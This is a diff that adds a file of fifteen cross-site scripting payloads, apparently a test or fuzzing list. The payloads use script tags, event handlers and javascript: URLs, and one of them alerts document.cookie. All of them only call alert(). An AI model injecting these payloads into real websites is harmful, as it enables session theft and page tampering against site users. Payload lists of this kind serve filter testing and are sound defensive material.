@@ -1,0 +1,15 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(document.cookie)>
+<iframe src="javascript:alert('XSS')"></iframe>
+<input type="text" value="<script>alert('XSS')</script>">
+<div onmouseover="alert('XSS')">Hover me</div>
+<a href="javascript:alert('XSS')">Click me</a>
+<body onload=alert('XSS')>
+<style>@import 'javascript:alert("XSS")';</style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<form action="javascript:alert('XSS')">
+<button formaction="javascript:alert('XSS')">
+<video><source onerror="alert('XSS')">
